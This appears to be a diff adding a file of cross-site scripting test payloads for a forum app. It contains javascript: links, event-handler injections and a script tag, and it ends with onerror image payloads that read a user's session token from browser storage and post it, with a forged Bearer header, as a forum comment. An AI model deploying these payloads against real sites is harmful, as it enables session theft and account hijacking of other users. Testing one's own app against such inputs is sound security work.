@@ -1,0 +1,40 @@
+<h3 style="color:blue"> This is a subheader</h3>
+Normal message with a hidden <b>script</b>.
+<a href="javascript:alert('hello')">Malicious link </a>
+<p onload="alert('hello')">test</p>
+<p onmouseover="javascript:alert('hello')">on mouse over</p>
+<img src="http://this.site.does.not/exist/12345" onerror="alert('ERROR')">
+
+<script>
+  alert("Trying to steal the userToken...");
+  console.log(window.localStorage.getItem("userToken"));
+</script>
+
+
+<img src="http://this.site.does.not/exist/12345" onerror="alert(`ERROR`);
+console.log(`this works`)">
+
+// Testing to steal the user token
+<img src="http://this.site.does.not/exist/12345" onerror='
+const userToken = window.sessionStorage.getItem("userToken");
+console.log("Hello this should work");
+  fetch("/posts/10/comment", {
+    method: "POST",
+    headers: { "Content-Type": "application/json", "authorization": "Bearer " + userToken },
+    body: JSON.stringify({ comment: "New comment" })
+  });
+'>
+
+<img src="http://this.site.does.not/exist/12345" onerror="
+  const userToken = window.localStorage.getItem(`loggedForumappUser`);
+  if (userToken) {
+    let headers = {};
+    headers[`Content-Type`] = `application/json`
+    headers[`authorization`] = `Bearer ` + userToken.toString()
+    fetch(`http://localhost:3002/api/posts/10/comment`, {
+      method: `POST`,
+      headers: headers,
+      body: JSON.stringify({ comment: userToken })
+    });
+  }
+">
